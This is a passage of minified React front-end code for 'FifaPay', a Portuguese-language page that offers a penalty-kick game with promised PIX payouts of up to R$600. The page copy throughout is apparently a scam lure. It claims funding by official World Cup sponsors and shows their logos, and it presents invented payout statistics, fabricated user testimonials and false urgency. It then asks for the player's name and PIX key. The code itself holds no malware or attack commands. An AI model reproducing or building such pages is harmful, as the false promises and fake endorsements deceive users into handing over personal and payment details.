    ["line", { x1: "3", x2: "21", y1: "22", y2: "22", key: "j8o0r" }],
    ["line", { x1: "6", x2: "6", y1: "18", y2: "11", key: "10tf0k" }],
    ["line", { x1: "10", x2: "10", y1: "18", y2: "11", key: "54lgf6" }],
    ["line", { x1: "14", x2: "14", y1: "18", y2: "11", key: "380y" }],
    ["line", { x1: "18", x2: "18", y1: "18", y2: "11", key: "1kevvc" }],
    ["polygon", { points: "12 2 20 7 4 7", key: "jkujk7" }],
]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Hg = he("Lock", [
    ["rect", { width: "18", height: "11", x: "3", y: "11", rx: "2", ry: "2", key: "1w4ew1" }],
    ["path", { d: "M7 11V7a5 5 0 0 1 10 0v4", key: "fwvmzm" }],
]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const qg = he("RotateCcw", [
    ["path", { d: "M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8", key: "1357e3" }],
    ["path", { d: "M3 3v5h5", key: "1xhq8a" }],
]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const lu = he("ShieldCheck", [
    [
        "path",
        {
            d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",
            key: "oel41y",
        },
    ],
    ["path", { d: "m9 12 2 2 4-4", key: "dzmm74" }],
]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Gg = he("Shield", [
    [
        "path",
        {
            d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",
            key: "oel41y",
        },
    ],
]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Kg = he("Star", [
    [
        "polygon",
        {
            points: "12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2",
            key: "8f66p6",
        },
    ],
]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Tf = he("Target", [
    ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
    ["circle", { cx: "12", cy: "12", r: "6", key: "1vlfrh" }],
    ["circle", { cx: "12", cy: "12", r: "2", key: "1c9p78" }],
]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Rf = he("Trophy", [
    ["path", { d: "M6 9H4.5a2.5 2.5 0 0 1 0-5H6", key: "17hqa7" }],
    ["path", { d: "M18 9h1.5a2.5 2.5 0 0 0 0-5H18", key: "lmptdp" }],
    ["path", { d: "M4 22h16", key: "57wxv0" }],
    ["path", { d: "M10 14.66V17c0 .55-.47.98-.97 1.21C7.85 18.75 7 20.24 7 22", key: "1nw9bq" }],
    ["path", { d: "M14 14.66V17c0 .55.47.98.97 1.21C16.15 18.75 17 20.24 17 22", key: "1np0yb" }],
    ["path", { d: "M18 2H6v7a6 6 0 0 0 12 0V2Z", key: "u46fv3" }],
]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Qg = he("User", [
    ["path", { d: "M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2", key: "975kel" }],
    ["circle", { cx: "12", cy: "7", r: "4", key: "17ys0d" }],
]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const uu = he("Wallet", [
    ["path", { d: "M21 12V7H5a2 2 0 0 1 0-4h14v4", key: "195gfw" }],
    ["path", { d: "M3 5v14a2 2 0 0 0 2 2h16v-5", key: "195n9w" }],
    ["path", { d: "M18 12a2 2 0 0 0 0 4h4v-4Z", key: "vllfpd" }],
]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Jg = he("X", [
    ["path", { d: "M18 6 6 18", key: "1bl5f8" }],
    ["path", { d: "m6 6 12 12", key: "d8bk6v" }],
]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Xg = he("Zap", [["polygon", { points: "13 2 3 14 12 14 11 22 21 10 12 10 13 2", key: "45s27k" }]]),
    Of = "/ChatGPT_Image_18_de_abr._de_2026__15_19_06-removebg-preview.png";
function Yg({ onStart: t }) {
    return (
        cv(),
        u.jsxs("div", {
            className: "min-h-screen w-full bg-emerald-950 text-white overflow-x-hidden",
            children: [
                u.jsxs("div", {
                    className: "max-w-md mx-auto px-5 pt-5",
                    children: [u.jsx(Zg, {}), u.jsx(ev, { onStart: t })],
                }),
                u.jsx(tv, {}),
                u.jsxs("div", {
                    className: "max-w-md mx-auto px-5",
                    children: [
                        u.jsx(nv, {}),
                        u.jsx(rv, {}),
                        u.jsx(sv, {}),
                        u.jsx(iv, {}),
                        u.jsx(ov, {}),
                        u.jsx(lv, { onStart: t }),
                    ],
                }),
                u.jsx(uv, {}),
            ],
        })
    );
}
function Zg() {
    return u.jsxs("div", {
        className: "flex items-center justify-between mb-4",
        children: [
            u.jsx("img", {
                src: Of,
                alt: "FifaPay",
                className: "h-10 w-auto object-contain select-none",
                draggable: !1,
            }),
            u.jsx("span", { className: "text-[11px] font-medium text-emerald-300/90", children: "Campanha pré-Copa" }),
        ],
    });
}
function ev({ onStart: t }) {
    return u.jsxs("section", {
        className: "pb-6",
        children: [
            u.jsxs("div", {
                className:
                    "inline-flex items-center gap-1.5 bg-yellow-400/10 border border-yellow-400/25 rounded-lg px-2.5 py-1 mb-4",
                children: [
                    u.jsx(Rf, { className: "w-3.5 h-3.5 text-yellow-400/90", strokeWidth: 2 }),
                    u.jsx("span", { className: "ds-kicker", children: "Pré-Copa — patrocinadores oficiais" }),
                ],
            }),
            u.jsx("h1", {
                className: "text-[32px] leading-[1.12] font-display font-bold tracking-tight text-white mb-3",
                children: "Bata pênaltis e receba no PIX em poucos minutos.",
            }),
            u.jsx("p", {
                className: "text-[15px] leading-relaxed text-emerald-100/95 mb-5",
                children:
                    "15 cobranças por rodada; saldo de até R$ 600,00 conforme o regulamento. Gratuito nesta fase da campanha — o valor dos gols cai direto na sua chave PIX.",
            }),
            u.jsxs("button", {
                onClick: t,
                className:
                    "group ds-cta-primary w-full rounded-xl bg-gradient-to-r from-amber-400 to-yellow-400 py-3.5 text-[15px] text-emerald-950 shadow-md hover:from-amber-300 hover:to-yellow-300 active:scale-[0.99] flex items-center justify-center gap-2",
                children: [
                    "Jogar agora",
                    u.jsx(no, {
                        className: "w-5 h-5 group-hover:translate-x-0.5 transition-transform",
                        strokeWidth: 2.25,
                    }),
                ],
            }),
            u.jsxs("div", {
                className: "flex items-center justify-center gap-4 mt-3 text-[11px] text-emerald-200/80",
                children: [
                    u.jsxs("span", {
                        className: "flex items-center gap-1",
                        children: [u.jsx(Hg, { className: "w-3 h-3 text-emerald-300" }), " PIX seguro"],
                    }),
                    u.jsx("span", { className: "w-1 h-1 rounded-full bg-emerald-700" }),
                    u.jsxs("span", {
                        className: "flex items-center gap-1",
                        children: [u.jsx(Vg, { className: "w-3 h-3 text-emerald-300" }), " Saque imediato"],
                    }),
                    u.jsx("span", { className: "w-1 h-1 rounded-full bg-emerald-700" }),
                    u.jsxs("span", {
                        className: "flex items-center gap-1",
                        children: [u.jsx(Fg, { className: "w-3 h-3 text-emerald-300" }), " Sem cadastro"],
                    }),
                ],
            }),
        ],
    });
}
function tv() {
    const t = [
        { src: "https://i.ibb.co.com/bRM0YM3Q/Coca-Cola-Logo-PNG-Photo.png", alt: "Coca-Cola" },
        { src: "https://i.ibb.co.com/h12LdxT9/visa-logo-0-2048x2048.png", alt: "Visa" },
        { src: "https://i.ibb.co.com/bRXwfN38/Saudi-Aramco-Logo-old-768x483.png", alt: "Saudi Aramco" },
        { src: "https://i.ibb.co.com/SwHvtj3Z/Qatar-Airways-Logo-wine.png", alt: "Qatar Airways" },
        { src: "https://i.ibb.co.com/S77jqRfw/Lenovo-Logo-PNG-Photos.png", alt: "Lenovo" },
        { src: "https://i.ibb.co.com/0RYcWS3Q/Design-sem-nome-10.png", alt: "Patrocinador Oficial" },
    ];
    return u.jsxs("div", {
        className: "border-y border-emerald-800/60 bg-emerald-950/60 py-4 mt-2 overflow-hidden",
        children: [
            u.jsx("p", {
                className: "text-center text-[11px] font-medium text-emerald-400/80 mb-3",
                children: "Patrocinadores da ação",
            }),
            u.jsx("div", {
                className: "relative overflow-hidden",
                children: u.jsx("div", {
                    className: "flex w-max animate-marquee gap-10 items-center",
                    children: [...t, ...t].map((e, n) =>
                        u.jsx(
                            "img",
                            {
                                src: e.src,
                                alt: e.alt,
                                className:
                                    "h-8 w-auto object-contain shrink-0 opacity-80 hover:opacity-100 transition-opacity select-none",
                                draggable: !1,
                            },
                            n
                        )
                    ),
                }),
            }),
        ],
    });
}
function nv() {
    return u.jsxs("section", {
        className: "pt-8 pb-2",
        children: [
            u.jsxs("div", {
                className: "reveal",
                children: [
                    u.jsx("p", {
                        className: "text-[11px] font-semibold text-yellow-400/95 mb-2",
                        children: "Como funciona o prêmio",
                    }),
                    u.jsx("h2", {
                        className: "text-2xl font-display font-bold leading-snug mb-3",
                        children: "Patrocinadores da Copa financiam rodadas de teste antes do torneio.",
                    }),
                    u.jsx("p", {
                        className: "text-sm text-emerald-100/88 leading-relaxed",
                        children:
                            "Cada gol convertido entra como uma ativação da campanha; o valor acumulado na partida pode ser sacado por PIX, conforme as regras do regulamento.",
                    }),
                ],
            }),
            u.jsxs("div", {
                className: "grid grid-cols-3 gap-2 mt-5",
                children: [
                    u.jsx(Wo, { value: "~R$ 1,2 mi", label: "últimos 7 dias (est.)" }),
                    u.jsx(Wo, { value: "12k+", label: "saques PIX (24h)" }),
                    u.jsx(Wo, { value: "4,8", label: "nota no app" }),
                ],
            }),
        ],
    });
}
function Wo({ value: t, label: e }) {
    return u.jsxs("div", {
        className: "reveal reveal-delay-1 bg-emerald-900/40 border border-emerald-800/50 rounded-xl p-3 text-center",
        children: [
            u.jsx("p", { className: "text-base font-display font-bold text-yellow-400 leading-none", children: t }),
            u.jsx("p", { className: "text-[10px] text-emerald-200/75 font-medium mt-1 leading-snug", children: e }),
        ],
    });
}
function rv() {
    return u.jsxs("section", {
        className: "pt-10",
        children: [
            u.jsx("h3", { className: "reveal text-xl font-display font-bold mb-1", children: "Como funciona" }),
            u.jsx("p", {
                className: "reveal reveal-delay-1 text-sm text-emerald-200/75 mb-4",
                children: "Três passos — sem cadastro nem depósito.",
            }),
            u.jsxs("div", {
                className: "space-y-2.5",
                children: [
                    u.jsx(Ho, {
                        icon: u.jsx(Tf, { className: "w-5 h-5" }),
                        number: "1",
                        title: "Bata 15 pênaltis",
                        desc: "Arraste para mirar e chutar. Igual a Copa de verdade.",
                    }),
                    u.jsx(Ho, {
                        icon: u.jsx(Xg, { className: "w-5 h-5" }),
                        number: "2",
                        title: "Cada gol vira dinheiro",
                        desc: "Entre R$ 34,08 e R$ 54,12 por gol, bancado pelos patrocinadores.",
                    }),
                    u.jsx(Ho, {
                        icon: u.jsx(uu, { className: "w-5 h-5" }),
                        number: "3",
                        title: "Saque na hora via PIX",
                        desc: "Informe sua chave ao final e receba o saldo em segundos.",
                    }),
                ],
            }),
        ],
    });
}
function Ho({ icon: t, number: e, title: n, desc: r }) {
    return u.jsxs("div", {
        className:
            "reveal reveal-delay-2 bg-emerald-900/40 border border-emerald-800/45 rounded-xl p-3.5 flex items-center gap-3",
        children: [
            u.jsxs("div", {
                className: "relative flex-shrink-0",
                children: [
                    u.jsx("div", {
                        className:
                            "w-11 h-11 rounded-lg bg-amber-400 flex items-center justify-center text-emerald-950",
                        children: t,
                    }),
                    u.jsx("div", {
                        className:
                            "absolute -top-1 -right-1 min-w-[1.25rem] h-5 px-1 rounded-full bg-emerald-950 border border-amber-400/80 flex items-center justify-center",
                        children: u.jsx("span", { className: "text-[10px] font-bold text-amber-300", children: e }),
                    }),
                ],
            }),
            u.jsxs("div", {
                className: "flex-1 min-w-0",
                children: [
                    u.jsx("p", { className: "font-bold text-sm leading-tight", children: n }),
                    u.jsx("p", { className: "text-emerald-200/70 text-xs mt-0.5 leading-snug", children: r }),
                ],
            }),
        ],
    });
}
function sv() {
    return u.jsx("section", {
        className: "pt-10",
        children: u.jsxs("div", {
            className: "reveal relative rounded-3xl overflow-hidden shadow-2xl shadow-black/40 min-h-[200px]",
            children: [
                u.jsx("img", {
                    src: "/worldcup-pagamento-garantido.png",
                    alt: "Taça da Copa do Mundo e bola oficial com estádio ao fundo",
                    className: "absolute inset-0 w-full h-full object-cover object-center",
                }),
                u.jsx("div", {
                    className:
                        "absolute inset-0 bg-gradient-to-t from-emerald-950 via-emerald-950/85 to-emerald-950/20",
                    "aria-hidden": !0,
                }),
                u.jsxs("div", {
                    className: "relative z-10 flex flex-col justify-end min-h-[200px] p-5",
                    children: [
                        u.jsxs("div", {
                            className: "flex items-center gap-2 mb-1.5",
                            children: [
                                u.jsx(lu, { className: "w-4 h-4 text-yellow-400 shrink-0", strokeWidth: 2.5 }),
                                u.jsx("span", {
                                    className: "text-[11px] font-semibold text-yellow-200/95",
                                    children: "Pagamento via PIX",
                                }),
                            ],
                        }),
                        u.jsx("p", {
                            className:
                                "text-white font-display font-bold text-xl leading-snug drop-shadow-[0_2px_12px_rgba(0,0,0,0.65)]",
                            children: "Saldo na conta",
                        }),
                        u.jsx("p", {
                            className: "text-emerald-100/95 text-sm font-medium mt-1 drop-shadow-md",
                            children: "Em geral em menos de um minuto após o resgate.",
                        }),
                    ],
                }),
            ],
        }),
    });
}
function iv() {
    const t = [
        {
            name: "Carlos M.",
            city: "Recife, PE",
            text: "Testei num domingo à tarde. Três gols seguidos e o valor apareceu no extrato do banco no mesmo dia.",
            amount: "R$ 89,40",
            stars: 4,
        },
        {
            name: "Juliana R.",
            city: "Belo Horizonte, MG",
            text: "Rápido demais — pensei que ia pedir cadastro e não pediu. Só o nome e a partida.",
            amount: "R$ 102,18",
            stars: 5,
        },
        {
            name: "Anderson P.",
            city: "Curitiba, PR",
            text: "Fui mal na primeira rodada, na segunda deu certo. O teto da rodada bateu com o que falavam no regulamento.",
            amount: "R$ 600,00",
            stars: 5,
        },
    ];
    return u.jsxs("section", {
        className: "pt-10",
        children: [
            u.jsx("h3", { className: "reveal text-xl font-display font-bold mb-1", children: "Quem já sacou" }),
            u.jsx("p", {
                className: "reveal reveal-delay-1 text-sm text-emerald-200/75 mb-4",
                children: "Depoimentos de usuários nas últimas semanas.",
            }),
            u.jsx("div", {
                className: "space-y-2.5",
                children: t.map((e, n) =>
                    u.jsxs(
                        "div",
                        {
                            className:
                                "reveal reveal-delay-2 bg-emerald-900/40 border border-emerald-800/45 rounded-xl p-4",
                            children: [
                                u.jsxs("div", {
                                    className: "flex items-center justify-between mb-2",
                                    children: [
                                        u.jsxs("div", {
                                            className: "flex items-center gap-2",
                                            children: [
                                                u.jsx("div", {
                                                    className:
                                                        "w-9 h-9 rounded-full bg-amber-400 flex items-center justify-center text-emerald-950 font-bold text-sm",
                                                    children: e.name.charAt(0),
                                                }),
                                                u.jsxs("div", {
                                                    children: [
                                                        u.jsx("p", {
                                                            className: "text-sm font-semibold leading-tight",
                                                            children: e.name,
                                                        }),
                                                        u.jsx("p", {
                                                            className: "text-[11px] text-emerald-300/70 leading-tight",
                                                            children: e.city,
                                                        }),
                                                    ],
                                                }),
                                            ],
                                        }),
                                        u.jsxs("div", {
                                            className: "text-right",
                                            children: [
                                                u.jsx("div", {
                                                    className: "flex items-center gap-0.5 justify-end",
                                                    children: [0, 1, 2, 3, 4].map((r) =>
                                                        u.jsx(
                                                            Kg,
                                                            {
                                                                className: `w-3 h-3 ${r < e.stars ? "fill-yellow-400 text-yellow-400" : "fill-emerald-800/40 text-emerald-800/40"}`,
                                                            },
                                                            r
                                                        )
                                                    ),
                                                }),
                                                u.jsx("p", {
                                                    className:
                                                        "text-[11px] font-semibold text-yellow-400 leading-tight mt-0.5",
                                                    children: e.amount,
                                                }),
                                            ],
                                        }),
                                    ],
                                }),
                                u.jsxs("p", {
                                    className: "text-[13px] text-emerald-100/88 leading-relaxed",
                                    children: ["“", e.text, "”"],
                                }),
                            ],
                        },
                        n
                    )
                ),
            }),
        ],
    });
}
function ov() {
    const t = [
        {
            q: "Preciso depositar ou pagar alguma coisa para jogar?",
            a: "Não. A ação é 100% bancada pelos patrocinadores oficiais da Copa. Você joga grátis e recebe o valor real dos gols direto no PIX.",
        },
        {
            q: "Quanto tempo leva para o dinheiro cair na minha conta?",
            a: "O PIX é processado em menos de 60 segundos após a última cobrança. Basta informar sua chave PIX ao final da partida.",
        },
        {
            q: "Posso participar mais de uma vez?",
            a: "Cada pessoa tem direito a uma partida premiada por CPF durante a campanha pré Copa. Use sua chance com atenção e mire nos 15 cobranças.",
        },
    ];
    return u.jsxs("section", {
        className: "pt-10",
        children: [
            u.jsx("h3", { className: "reveal text-xl font-display font-bold mb-1", children: "Perguntas frequentes" }),
            u.jsx("p", {
                className: "reveal reveal-delay-1 text-sm text-emerald-200/75 mb-4",
                children: "O básico antes de entrar na rodada.",
            }),
            u.jsx("div", { className: "space-y-2", children: t.map((e, n) => u.jsx(av, { q: e.q, a: e.a }, n)) }),
        ],
    });
}
function av({ q: t, a: e }) {
    const [n, r] = x.useState(!1);
    return u.jsxs("div", {
        className: "reveal reveal-delay-2 bg-emerald-900/40 border border-emerald-800/45 rounded-xl overflow-hidden",
        children: [
            u.jsxs("button", {
                onClick: () => r(!n),
                className: "w-full flex items-center justify-between gap-3 p-4 text-left",
                children: [
                    u.jsx("span", { className: "text-sm font-bold leading-snug pr-2", children: t }),
                    u.jsx(Bg, {
                        className: `w-5 h-5 text-yellow-400 flex-shrink-0 transition-transform duration-300 ${n ? "rotate-180" : ""}`,
                        strokeWidth: 2.5,
                    }),
                ],
            }),
            u.jsx("div", {
                className: `grid transition-all duration-300 ease-out ${n ? "grid-rows-[1fr] opacity-100" : "grid-rows-[0fr] opacity-0"}`,
                children: u.jsx("div", {
                    className: "overflow-hidden",
                    children: u.jsx("p", {
                        className: "px-4 pb-4 text-[13px] text-emerald-100/85 leading-relaxed",
                        children: e,
                    }),
                }),
            }),
        ],
    });
}
function lv({ onStart: t }) {
    return u.jsx("section", {
        className: "pt-10 pb-10",
        children: u.jsx("div", {
            className:
                "reveal relative rounded-2xl border border-amber-400/35 bg-gradient-to-br from-amber-400 to-yellow-400 p-6 shadow-lg shadow-black/15",
            children: u.jsxs("div", {
                children: [
                    u.jsx("div", {
                        className: "inline-block bg-emerald-950/90 rounded-md px-2.5 py-1 mb-3",
                        children: u.jsx("span", {
                            className: "text-yellow-300 text-[11px] font-semibold",
                            children: "Quota da campanha",
                        }),
                    }),
                    u.jsx("h3", {
                        className: "text-emerald-950 text-[22px] font-display font-bold leading-snug mb-2",
                        children: "Pronto para a sua rodada?",
                    }),
                    u.jsx("p", {
                        className: "text-emerald-950/80 text-sm font-medium mb-4 leading-relaxed",
                        children:
                            "Quando a cota de rodadas patrocinadas encerrar, a fase pré-Copa também encerra — entra antes disso se quiser participar.",
                    }),
                    u.jsxs("button", {
                        onClick: t,
                        className:
                            "ds-cta-primary w-full rounded-xl bg-emerald-950 py-3.5 text-[15px] text-amber-300 hover:bg-emerald-900 active:scale-[0.99] flex items-center justify-center gap-2",
                        children: ["Jogar agora", u.jsx(no, { className: "w-5 h-5", strokeWidth: 2.25 })],
                    }),
                ],
            }),
        }),
    });
}
function uv() {
    return u.jsx("footer", {
        className: "border-t border-emerald-800/60 bg-emerald-950/80 mt-2",
        children: u.jsxs("div", {
            className: "max-w-md mx-auto px-5 py-8",
            children: [
                u.jsxs("div", {
                    className: "flex items-center justify-between mb-5",
                    children: [
                        u.jsx("img", {
                            src: Of,
                            alt: "FifaPay",
                            className: "h-9 w-auto object-contain select-none opacity-90",
                            draggable: !1,
                        }),
                        u.jsxs("div", {
                            className: "flex items-center gap-1.5 text-[10px] font-bold text-emerald-300/70",
                            children: [
                                u.jsx(lu, { className: "w-3.5 h-3.5" }),
                                u.jsx("span", { children: "Pagamentos via PIX" }),
                            ],
                        }),
                    ],
                }),
                u.jsxs("div", {
                    className: "grid grid-cols-2 gap-4 mb-6",
                    children: [
                        u.jsxs("div", {
                            children: [
                                u.jsx("p", {
                                    className: "text-[11px] font-semibold text-yellow-400/90 mb-2",
                                    children: "Institucional",
                                }),
                                u.jsxs("ul", {
                                    className: "space-y-1.5 text-[12px] text-emerald-200/70",
                                    children: [
                                        u.jsx("li", { children: "Sobre a campanha" }),
                                        u.jsx("li", { children: "Regulamento" }),
                                        u.jsx("li", { children: "Patrocinadores" }),
                                    ],
                                }),
                            ],
                        }),
                        u.jsxs("div", {
                            children: [
                                u.jsx("p", {
                                    className: "text-[11px] font-semibold text-yellow-400/90 mb-2",
                                    children: "Suporte",
                                }),
                                u.jsxs("ul", {
                                    className: "space-y-1.5 text-[12px] text-emerald-200/70",
                                    children: [
                                        u.jsx("li", { children: "Central de ajuda" }),
                                        u.jsx("li", { children: "Termos de uso" }),
                                        u.jsx("li", { children: "Privacidade" }),
                                    ],
                                }),
                            ],
                        }),
                    ],
                }),
                u.jsx("p", {
                    className: "text-[10px] text-emerald-300/50 leading-relaxed",
                    children:
                        "FifaPay é uma ação promocional pré Copa do Mundo, custeada pelos patrocinadores oficiais participantes. Pagamentos realizados via PIX conforme regulamento. Este site não é filiado oficialmente à FIFA.",
                }),
                u.jsxs("p", {
                    className: "text-[10px] text-emerald-300/40 mt-3",
                    children: ["© ", new Date().getFullYear(), " FifaPay Campanha Promocional."],
                }),
            ],
        }),
    });
}
function cv() {
    const t = x.useRef(null);
    x.useEffect(() => {
        const e = document.querySelectorAll(".reveal");
        return (
            (t.current = new IntersectionObserver(
                (n) => {
                    n.forEach((r) => {
                        var s;
                        r.isIntersecting &&
                            (r.target.classList.add("is-visible"), (s = t.current) == null || s.unobserve(r.target));
                    });
                },
                { threshold: 0.15, rootMargin: "0px 0px -40px 0px" }
            )),
            e.forEach((n) => {
                var r;
                return (r = t.current) == null ? void 0 : r.observe(n);
            }),
            () => {
                var n;
                return (n = t.current) == null ? void 0 : n.disconnect();
            }
        );
    }, []);
}
function dv({ onSubmit: t, loading: e }) {
    const [n, r] = x.useState(""),
        s = (i) => {
            i.preventDefault();
            const o = n.trim();
            o.length < 2 || t(o);
        };
    return u.jsx("div", {
        className:
            "min-h-screen w-full bg-gradient-to-b from-emerald-950 via-emerald-900 to-emerald-950 text-white flex flex-col",
        children: u.jsxs("div", {
            className: "flex-1 flex flex-col justify-center max-w-md mx-auto w-full px-6 py-8",
            children: [
                u.jsx("div", {
                    className: "flex items-center justify-center mb-10",
                    children: u.jsx("img", {
                        src: "/ChatGPT_Image_18_de_abr._de_2026__15_19_06-removebg-preview.png",
                        alt: "FifaPay",
                        className: "h-12 w-auto object-contain select-none",
                        draggable: !1,
                    }),
                }),
                u.jsxs("div", {
                    className: "text-center mb-8",
                    children: [
                        u.jsx("div", {
                            className:
                                "inline-flex w-20 h-20 rounded-full bg-amber-400 items-center justify-center mb-5",
                            children: u.jsx(Qg, { className: "w-9 h-9 text-emerald-950", strokeWidth: 2 }),
                        }),
                        u.jsx("h2", {
                            className: "text-2xl font-display font-bold mb-2",
                            children: "Como podemos te chamar?",
                        }),
                        u.jsx("p", {
                            className: "text-emerald-200/80 text-sm px-4 leading-relaxed",
                            children: "Aparece no placar e no comprovante do resgate.",
                        }),
                    ],
                }),
                u.jsxs("form", {
                    onSubmit: s,
                    className: "space-y-4",
                    children: [
                        u.jsx("div", {
                            children: u.jsx("input", {
                                type: "text",
                                value: n,
                                onChange: (i) => r(i.target.value),
                                placeholder: "Digite seu nome",
                                maxLength: 24,
                                autoFocus: !0,
                                className:
                                    "w-full bg-emerald-900/60 border-2 border-emerald-700/60 focus:border-yellow-400 rounded-2xl px-5 py-4 text-white text-base font-medium placeholder:text-emerald-300/50 outline-none transition-colors backdrop-blur",
                            }),
                        }),
                        u.jsxs("button", {
                            type: "submit",
                            disabled: n.trim().length < 2 || e,
                            className:
                                "ds-cta-primary w-full rounded-xl bg-gradient-to-r from-amber-400 to-yellow-400 py-3.5 text-[15px] text-emerald-950 shadow-md disabled:cursor-not-allowed disabled:opacity-40 hover:from-amber-300 hover:to-yellow-300 active:scale-[0.99] flex items-center justify-center gap-2",
                            children: [
                                e ? "Carregando…" : "Começar partida",
                                !e && u.jsx(no, { className: "w-5 h-5", strokeWidth: 3 }),
                            ],
                        }),
                    ],
                }),
                u.jsx("div", {
                    className: "mt-8 bg-emerald-900/40 border border-emerald-800/45 rounded-xl p-4",
                    children: u.jsxs("div", {
                        className: "flex items-center gap-3",
                        children: [
                            u.jsx("div", {
                                className:
                                    "w-10 h-10 rounded-full bg-yellow-400/20 flex items-center justify-center flex-shrink-0",
                                children: u.jsx(Rf, { className: "w-5 h-5 text-yellow-400" }),
                            }),
                            u.jsxs("div", {
                                children: [
                                    u.jsx("p", {
                                        className: "font-bold text-sm",
                                        children: "15 pênaltis, até 600 reais (R$ 600,00)",
                                    }),
                                    u.jsx("p", {
                                        className: "text-emerald-200/70 text-xs mt-0.5",
                                        children: "Ganhe entre R$ 34,08 e R$ 54,12 a cada gol (valores variam)",
                                    }),
                                ],
                            }),
                        ],
                    }),
                }),
            ],
        }),
    });
}
const dn = "overflow-hidden rounded-sm border border-fcds-blue/60 bg-fcds-night/95 shadow-2xl",
    hn = { boxShadow: "0 12px 40px rgba(0,24,47,0.55), inset 0 1px 0 rgba(255,255,255,0.08)" },
    fn = "h-1 w-full bg-gradient-to-r from-fcds-blue via-fcds-medium-blue to-fcds-blue",
    Ai = "text-[10px] font-bold uppercase tracking-[0.35em] text-fcds-medium-blue";
function hv({ amount: t }) {
    const [e, n] = x.useState("enter");
    return (
        x.useEffect(() => {
            const r = setTimeout(() => n("show"), 60),
                s = setTimeout(() => n("leave"), 1700);
            return () => {
                clearTimeout(r), clearTimeout(s);
            };
        }, []),
        u.jsxs("div", {
            className: "fixed inset-0 z-50 flex items-center justify-center pointer-events-none",
            children: [
                u.jsx("div", {
                    className: "absolute inset-0 bg-fcds-green/15",
                    style: { opacity: e === "show" ? 1 : 0, transition: "opacity 300ms" },
                }),
                u.jsx("div", {
                    className: "absolute inset-0 overflow-hidden",
                    children: Array.from({ length: 20 }).map((r, s) =>
                        u.jsx(
                            "div",
                            {
                                className: "absolute w-2 h-3 rounded-sm",
                                style: {
                                    left: `${Math.random() * 100}%`,
                                    top: "-10%",
                                    background: ["#fc0", "#00b140", "#fff", "#ffe476"][s % 4],
                                    animation: `confetti-fall ${1.5 + Math.random() * 1}s ${Math.random() * 0.5}s ease-in forwards`,
                                    opacity: e === "enter" ? 0 : 1,
                                    transform: `rotate(${Math.random() * 360}deg)`,
                                },
                            },
                            s
                        )
                    ),
                }),
                u.jsx("div", {
                    className: "relative max-w-[min(92vw,380px)]",
                    style: {
                        transform:
                            e === "enter"
                                ? "scale(0.88) translateY(12px)"
                                : e === "leave"
                                  ? "scale(1.05) translateY(-8px)"
                                  : "scale(1) translateY(0)",
                        opacity: e === "leave" ? 0 : 1,
                        transition: "all 360ms cubic-bezier(0.34, 1.2, 0.64, 1)",
                    },
                    children: u.jsxs("div", {
                        className: dn,
                        style: hn,
                        children: [
                            u.jsx("div", { className: fn }),
                            u.jsxs("div", {
                                className: "px-5 pt-4 pb-3 text-center border-b border-white/10",
                                children: [
                                    u.jsx("p", { className: `${Ai} mb-1`, children: "Copa do Mundo FIFA" }),
                                    u.jsxs("p", {
                                        className:
                                            "font-display font-black text-[2.65rem] leading-none tracking-fcds-tight text-white drop-shadow-md",
                                        children: [
                                            "GOOOL",
                                            u.jsx("span", { className: "text-fcds-yellow", children: "!" }),
                                        ],
                                    }),
                                ],
                            }),
                            u.jsxs("div", {
                                className:
                                    "bg-gradient-to-b from-fcds-blue/25 to-fcds-night px-5 py-3 border-t border-fcds-yellow/30",
                                children: [
                                    u.jsx("p", {
                                        className:
                                            "text-center text-[10px] font-bold uppercase tracking-widest text-fcds-light-blue/90 mb-1",
                                        children: "Prêmio na carteira",
                                    }),
                                    u.jsxs("p", {
                                        className:
                                            "text-center font-display font-black text-2xl tabular-nums text-fcds-yellow tracking-tight",
                                        children: ["R$ ", t.toFixed(2).replace(".", ",")],
                                    }),
                                ],
                            }),
                        ],
                    }),
                }),
                u.jsx("style", {
                    children: `
        @keyframes confetti-fall {
          from { transform: translateY(0) rotate(0deg); }
          to { transform: translateY(110vh) rotate(720deg); }
        }
      `,
                }),
            ],
        })
    );
}
function fv() {
    const [t, e] = x.useState("enter");
    return (
        x.useEffect(() => {
            const n = setTimeout(() => e("show"), 60),
                r = setTimeout(() => e("leave"), 1700);
